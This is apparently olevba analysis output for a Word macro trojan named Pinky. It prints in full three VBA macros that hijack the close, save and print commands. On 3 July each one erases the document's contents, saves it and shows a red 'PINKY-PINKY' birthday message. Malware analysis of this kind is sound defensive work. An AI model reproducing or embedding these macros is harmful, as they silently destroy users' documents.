olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Pinky.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.Pinky.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ArchivoCerrar.bas 
in file: Trojan.MSWord.Pinky.a - OLE stream: 'Macros/VBA/ArchivoCerrar'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub ArchivoCerrar()
'
' ArchivoImprimir Macro
' Imprime el documento activo de Microsoft Word.
'
If WordBasic.Day(WordBasic.Now()) = 3 And WordBasic.Month(WordBasic.Now()) = 7 Then
    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1
    ActiveDocument.Save
    Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
    Selection.Font.Size = 48
    Selection.Font.Color = wdColorRed
    Selection.TypeText Text:="PINKY-PINKY"
    Selection.TypeParagraph
    Selection.Font.Color = wdColorAutomatic
    Selection.Font.Size = 28
    Selection.TypeText Text:="Te dice:"
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.TypeText Text:="""El 3 de julio es mi cumpleaños,"
    Selection.TypeParagraph
    Selection.TypeText Text:="espero que te acuerdes de mí"""
    Selection.TypeParagraph
    ActiveDocument.Save
    Application.Dialogs.Application.EnableCancelKey = wdCancelInterrupt
    ActiveDocument.Close
Else
    ActiveDocument.Close
End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO ArchivoGuardar.bas 
in file: Trojan.MSWord.Pinky.a - OLE stream: 'Macros/VBA/ArchivoGuardar'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub ArchivoGuardar()
'
' ArchivoImprimir Macro
' Imprime el documento activo de Microsoft Word.
'
If WordBasic.Day(WordBasic.Now()) = 3 And WordBasic.Month(WordBasic.Now()) = 7 Then
    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1
    ActiveDocument.Save
    Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
    Selection.Font.Size = 48
    Selection.Font.Color = wdColorRed
    Selection.TypeText Text:="PINKY-PINKY"
    Selection.TypeParagraph
    Selection.Font.Color = wdColorAutomatic
    Selection.Font.Size = 28
    Selection.TypeText Text:="Te dice:"
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.TypeText Text:="""El 3 de julio es mi cumpleaños,"
    Selection.TypeParagraph
    Selection.TypeText Text:="espero que te acuerdes de mí"""
    Selection.TypeParagraph
    ActiveDocument.Save
    Application.Dialogs.Application.EnableCancelKey = wdCancelInterrupt
    ActiveDocument.Close
Else
    ActiveDocument.Save
End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO ArchivoImprimir.bas 
in file: Trojan.MSWord.Pinky.a - OLE stream: 'Macros/VBA/ArchivoImprimir'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub ArchivoImprimir()
Attribute ArchivoImprimir.VB_Description = "Imprime el documento activo de Microsoft Word."
Attribute ArchivoImprimir.VB_ProcData.VB_Invoke_Func = "TemplateProject.NewMacros.ArchivoImprimir"
'
' ArchivoImprimir Macro
' Imprime el documento activo de Microsoft Word.
'
If WordBasic.Day(WordBasic.Now()) = 3 And WordBasic.Month(WordBasic.Now()) = 7 Then
    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1
    ActiveDocument.Save
    Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
    Selection.Font.Size = 48
    Selection.Font.Color = wdColorRed
    Selection.TypeText Text:="PINKY-PINKY"
    Selection.TypeParagraph
    Selection.Font.Color = wdColorAutomatic
    Selection.Font.Size = 28
    Selection.TypeText Text:="Te dice:"
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.TypeText Text:="""El 3 de julio es mi cumpleaños,"
    Selection.TypeParagraph
    Selection.TypeText Text:="espero que te acuerdes de mí"""
    Selection.TypeParagraph
    ActiveDocument.Save
    Application.Dialogs.Application.EnableCancelKey = wdCancelInterrupt
    ActiveDocument.Close
Else
    ActiveDocument.PrintOut
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

